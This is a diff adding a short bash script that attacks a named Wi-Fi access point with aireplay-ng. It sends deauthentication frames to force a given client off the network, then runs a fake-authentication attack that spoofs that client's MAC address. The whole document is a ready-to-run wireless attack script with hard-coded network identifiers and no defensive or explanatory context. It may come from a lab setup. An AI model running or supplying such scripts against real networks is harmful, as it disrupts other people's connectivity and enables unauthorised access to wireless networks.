@@ -1,0 +1,11 @@
+#! /usr/bin/env bash
+
+#run a fakeauth attack against target essid
+
+MAC="$1"
+mode="--fakeauth"
+card="wlan0"
+essid="IRTSortAP_1"
+bssid="00:02:6F:92:10:5C"
+sudo aireplay-ng --deauth 2 -a "$bssid" "$card" -c "$MAC"
+sudo aireplay-ng "$mode" 0 -q 9 "$card" -h "$MAC" -e "$essid"
